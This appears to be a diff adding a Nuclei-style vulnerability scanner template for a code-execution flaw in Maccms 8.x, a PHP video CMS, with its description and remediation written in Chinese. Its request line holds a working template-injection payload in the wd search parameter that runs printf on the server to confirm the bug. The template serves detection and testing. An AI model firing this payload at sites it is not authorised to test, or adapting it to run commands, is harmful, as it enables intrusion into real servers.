@@ -1,0 +1,24 @@
+id: maccms-rce
+info:
+  name: Maccms Rce
+  author:
+  - l0ne1y
+  description: |-
+    Maccms 命令执行漏洞
+    Maccms是一套基于PHP的影视内容管理系统（CMS）。
+
+    Maccms8.x版本存在代码执行漏洞，攻击者可利用该漏洞执行任意命令。
+  severity: critical
+  remediation: |-
+    临时修复方案：
+    1、对wd参数输入进行过滤。
+    2、使用自定义函数或函数库实现外部应用程序或命令的功能。
+    3、在执行system、eval等命令执行功能的函数前，校验参数内容。
+requests:
+- matchers:
+  - type: dsl
+    dsl:
+    - contains(body,randstr) && (status_code==200 || status_code==500)
+  path:
+  - '{{BaseURL}}/index.php?m=vod-search&wd={if-A:printf({{randstr}})}{endif-A}'
+  method: GET
